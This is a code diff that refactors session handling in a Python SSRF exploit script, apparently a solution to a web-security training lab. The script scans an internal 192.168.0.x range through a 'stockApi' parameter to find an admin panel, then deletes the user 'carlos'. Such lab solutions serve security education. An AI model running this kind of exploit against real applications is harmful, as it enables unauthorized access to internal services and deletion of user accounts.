@@ -1,14 +1,12 @@
 import sys
 import requests
-from requests.adapters import HTTPAdapter
-from urllib3.util.retry import Retry
+from requests.adapters import HTTPAdapter, Retry
 
 
 
-def find_admin_interface(url):
+def find_admin_interface(url, session):
     try:
-        session = requests.Session()
-        session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
+
         for i in range(1, 256):
             admin_interface_url = f"http://192.168.0.{i}:8080/admin"
             response = session.post(f"{url}/product/stock", data={"stockApi": admin_interface_url}, timeout=10)
@@ -24,10 +22,7 @@ def find_admin_interface(url):
         sys.exit(1)
 
 
-def delete_carlos_user(url, admin_interface_url):
-    session = requests.Session()
-    session.mount("https://", HTTPAdapter(max_retries=Retry(total=5, backoff_factor=0.1)))
-
+def delete_carlos_user(url, session, admin_interface_url):
     # Deleting Carlos user
     session.post(f"{url}/product/stock", data={"stockApi": f"{admin_interface_url}/delete?username=carlos"}, allow_redirects=False)
 
@@ -44,8 +39,11 @@ def main():
 
 
     url = sys.argv[1].rstrip("/")
+    session = requests.Session()
+    session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
+
     print("(+) Finding admin interface...")
-    admin_interface_url = find_admin_interface(url)
+    admin_interface_url = find_admin_interface(url, session)
     if admin_interface_url:
         print(f"(+) Admin interface found at: {admin_interface_url}")
     else:
@@ -53,7 +51,7 @@ def main():
         sys.exit(1)
 
     print("(+) Deleting Carlos user...")
-    if delete_carlos_user(url, admin_interface_url):
+    if delete_carlos_user(url, session, admin_interface_url):
         print("(+) Carlos user successfully deleted")
     else:
         print("(-) Carlos user has not been successfully deleted")
